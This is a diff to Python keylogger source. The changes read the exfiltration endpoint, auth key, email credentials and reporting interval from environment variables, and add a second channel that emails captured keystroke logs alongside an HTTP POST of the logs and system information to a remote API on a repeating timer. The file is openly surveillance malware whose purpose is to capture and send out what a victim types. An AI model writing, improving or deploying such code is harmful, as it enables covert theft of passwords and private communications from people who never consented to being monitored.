@@ -16,6 +16,7 @@ import json
 from requests.structures import CaseInsensitiveDict
 from datetime import datetime, timedelta
 from datetime import datetime
+import env
 
 
 class Keylogger:
@@ -49,6 +50,7 @@ class Keylogger:
 
     def report(self):
         self.api_call(self.log)
+        self.send_mail(self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
@@ -59,7 +61,7 @@ class Keylogger:
         message = (
             "Subject: Logger Report\n\n"
             + "Report From:\n\n"
-            + self.system_info
+            + str(self.system_info)
             + "\n\nLogs:\n"
             + message
         )
@@ -79,9 +81,9 @@ class Keylogger:
         now = datetime.now()
         start = now - timedelta(seconds=self.interval)
         array = self.get_system_info()
-        url = "[API_URL]"
+        url = os.getenv("API_URL")
         self.headers["Accept"] = "application/json"
-        self.headers["Authorization"] = "Basic [BASIC_AUTH_KEY]"
+        self.headers["Authorization"] = "Basic " + os.getenv("API_PASS")
         self.headers["Content-Type"] = "application/json"
         data_json = {
             "logs": message,
@@ -96,5 +98,9 @@ class Keylogger:
         print(requests.post(url, headers=self.headers, data=data))
 
 
-keylogger = Keylogger(5, "[YOUR_EMAIL_HERE]", "[EMAIL_PASSWORD_HERE]")
+# Driver Code
+EMAIL = os.getenv("EMAIL")
+PASSWORD = os.getenv("PASSWORD")
+INTERVAL = int(os.getenv("INTERVAL"))
+keylogger = Keylogger(INTERVAL, EMAIL, PASSWORD)
 keylogger.start()
